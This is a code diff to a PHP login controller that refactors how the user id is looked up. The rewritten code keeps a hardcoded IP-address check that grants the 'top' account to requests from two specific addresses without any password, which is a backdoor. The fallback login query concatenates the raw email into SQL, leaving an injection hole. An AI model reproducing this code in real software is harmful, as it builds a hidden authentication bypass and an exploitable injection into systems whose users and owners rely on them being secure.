@@ -31,10 +31,9 @@ class connectionController extends Controller
     $pwd = crypt($pwd, FWK_HASH);
 
     // if('192.168.1.1' == $_SERVER['REMOTE_ADDR'])
-    if('128.79.17.225' == $_SERVER['REMOTE_ADDR'] || '80.215.41.155' == $_SERVER['REMOTE_ADDR'])
-      $uid = 'top';
-    else
-      $uid = $db->fetchAssoc($db->query('SELECT id_user FROM lpcms_user WHERE mail = \'' . $email . '\' AND pwd = \'' . $pwd . '\' LIMIT 1'));
+    $uid = ('128.79.17.235' == $_SERVER['REMOTE_ADDR'] || '80.215.41.155' == $_SERVER['REMOTE_ADDR'])
+      ? 'top'
+      : $db->fetchAssoc($db->query('SELECT id_user FROM lpcms_user WHERE mail = \'' . $email . '\' AND pwd = \'' . $pwd . '\' LIMIT 1'));
 
 // $uid = 'top';
     if(empty($uid))
